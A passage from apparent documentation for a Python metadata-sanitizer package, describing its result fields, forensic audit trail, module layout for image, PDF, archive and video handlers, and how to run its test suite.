  result.sanitized                    — True if any modifications were made
  result.mode                         — Mode that was used
  result.changes                      — List of SanitizationChange records
  result.metadata_before.hash_sha256  — Before-hash for forensic audit
  result.metadata_after.hash_sha256   — After-hash for forensic audit
  result.file_valid_after_sanitization— Post-sanitization integrity check

FORENSIC TRAIL:
  • .orig files preserved before modification
  • SHA-256 before/after hashes in result
  • Full change log with field name, action, reason, severity
  • Post-sanitization verification with auto-restore on corruption

FILE LAYOUT:
  metadata_sanitizer/
  ├─ __init__.py          Public API exports
  ├─ config.py            SanitizerConfig (25+ parameters)
  ├─ models.py            Dataclasses: SanitizationResult, Change, etc.
  ├─ sanitizer.py         MetadataSanitizer orchestrator
  ├─ handlers/
  │   ├─ __init__.py      HANDLER_REGISTRY (MIME → handler)
  │   ├─ base_handler.py  Abstract base class
  │   ├─ image_handler.py EXIF scrubbing
  │   ├─ text_handler.py  Encoding normalization
  │   ├─ archive_handler.py  ZIP/TAR inspection
  │   ├─ pdf_handler.py   JS/action removal
  │   └─ video_handler.py MP4/MKV atoms
  ├─ rules/
  │   ├─ exif_rules.py    EXIF tag strip/keep/flag lists
  │   ├─ pdf_rules.py     Dangerous PDF keys + patterns
  │   └─ video_rules.py   Video atom strip/preserve lists
  └─ tests/
      └─ test_sanitizer.py  94 unit tests

TEST SUITE:
  cd /path/to/BTP
  python -m pytest metadata_sanitizer/tests/ -v
```